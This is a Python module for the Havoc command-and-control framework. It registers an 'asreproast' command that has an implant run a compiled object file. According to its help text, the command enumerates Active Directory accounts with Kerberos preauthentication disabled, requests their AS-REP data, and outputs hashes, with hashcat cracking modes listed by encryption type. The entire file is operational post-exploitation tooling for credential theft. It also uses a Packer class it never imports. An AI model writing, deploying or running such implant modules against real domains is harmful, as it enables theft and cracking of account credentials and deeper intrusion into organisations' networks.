from havoc import Demon, RegisterCommand, RegisterModule

def asreproast( demonID, *param ):
    TaskID : str    = None
    demon  : Demon  = None
    packer : Packer = Packer()

    arg1   : str   = ""
    num_params = len(param)

    demon = Demon( demonID )

    if num_params > 1:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Usage: asreproast [username]" )
        return

    if num_params == 1:
        arg1 = param[ 0 ]

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Tasked demon to execute AS-REP roasting" )

    packer.addstr( arg1 )

    demon.InlineExecute( TaskID, "go", f"bin/asreproast.{demon.ProcessArch}.o", packer.getbuffer(), False )

    return TaskID

ASREPROAST_HELP = (
    "AS-REP Roasting: find accounts with Kerberos preauthentication disabled\n"
    "and extract their AS-REP encrypted data as crackable hashes.\n"
    "\n"
    "Targets accounts where the DONT_REQUIRE_PREAUTH UAC flag (0x400000)\n"
    "is set. Sends a raw AS-REQ without preauthentication data to the KDC\n"
    "and parses the AS-REP to emit offline-crackable hashes.\n"
    "\n"
    "USAGE:\n"
    "  asreproast\n"
    "      Enumerate ALL DONT_REQUIRE_PREAUTH accounts via LDAP and\n"
    "      roast each one.\n"
    "  asreproast <username>\n"
    "      Roast a specific sAMAccountName (skips LDAP enumeration).\n"
    "\n"
    "EXAMPLES:\n"
    "  asreproast\n"
    "  asreproast svc_backup\n"
    "\n"
    "HASHCAT MODES by encryption type:\n"
    "  RC4 (etype 23)         -> mode 18200\n"
    "  AES128 (etype 17)      -> mode 19600\n"
    "  AES256 (etype 18)      -> mode 19700"
)

RegisterCommand( asreproast, "", "asreproast", "Extract AS-REP hashes from accounts with preauthentication disabled", 0, ASREPROAST_HELP, "svc_backup" )
